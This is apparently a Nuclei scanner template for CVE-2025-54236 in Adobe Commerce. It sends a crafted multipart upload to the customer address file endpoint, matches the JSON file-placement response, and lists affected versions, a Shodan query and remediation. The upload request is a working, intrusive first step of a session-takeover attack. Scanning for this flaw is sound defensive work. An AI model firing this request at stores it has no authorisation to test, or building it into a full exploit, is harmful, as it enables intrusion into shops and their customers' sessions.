http:
- matchers:
  - condition: and
    dsl:
    - status_code == 200
    - contains(content_type, "application/json")
    - contains_any(body, "full_path","tmp_name","size","{{base64}}" )
    type: dsl
  raw:
  - "POST /customer/address_file/upload HTTP/1.1\nHost: {{Hostname}}\nContent-Type:\
    \ multipart/form-data; boundary=----WebKitFormBoundaryDNFoGI9h3cNjiBCQ\nCookie:\
    \ form_key={{form_key}}\n\n------WebKitFormBoundaryDNFoGI9h3cNjiBCQ\nContent-Disposition:\
    \ form-data; name=\"form_key\"\n\n{{form_key}}\n------WebKitFormBoundaryDNFoGI9h3cNjiBCQ\n\
    Content-Disposition: form-data; name=\"custom_attributes[country_id]\"; filename=\"\
    {{filename}}\"\nContent-Type: text/plain\n\n{{marker}}\n------WebKitFormBoundaryDNFoGI9h3cNjiBCQ--\n\
    \n{\n  \"name\": \"{{filename}}\",\n  \"full_path\": \"{{filename}}\",\n  \"type\"\
    : \"text/plain\",\n  \"tmp_name\": \"{{filename}}\",\n  \"error\": 0,\n  \"size\"\
    : 11,\n  \"file\": \"/t/e/{{filename}}\",\n  \"url\": \"{{RootURL}}/customer/address/viewfile/file/{{base64}}~~/\"\
    \n}\n"
id: CVE-2025-54236
info:
  author: DhiyaneshDK,slcyber,johnk3r
  description: 'Adobe Commerce versions 2.4.9-alpha2, 2.4.8-p2, 2.4.7-p7, 2.4.6-p12,
    2.4.5-p14, 2.4.4-p15 and earlier are affected by an Improper Input Validation
    vulnerability. A successful attacker can abuse this to achieve session takeover,
    increasing the confidentiality, and integrity impact to high. Exploitation of
    this issue does not require user interaction.

    '
  impact: 'Attackers can take over user sessions, compromising confidentiality and
    integrity of user data.

    '
  metadata:
    max-request: 1
    shodan-query: X-Magento-Tags
    verified: true
  name: Adobe Commerce - Authentication Bypass
  reference:
  - https://slcyber.io/assetnote-security-research-center/why-nested-deserialization-is-still-harmful-magento-rce-cve-2025-54236/?v=2
  - https://sansec.io/research/sessionreaper
  remediation: 'Update to the latest Adobe Commerce version.

    '
  severity: critical
  tags: cve,cve2025,file-upload,intrusive,auth-bypass,kev,vkev
variables:
  base64: '{{base64(filename)}}'
  filename: '{{to_lower(rand_text_alpha(5))}}'
  form_key: '{{rand_text_alphanumeric(16)}}'
  marker: '{{randstr}}'
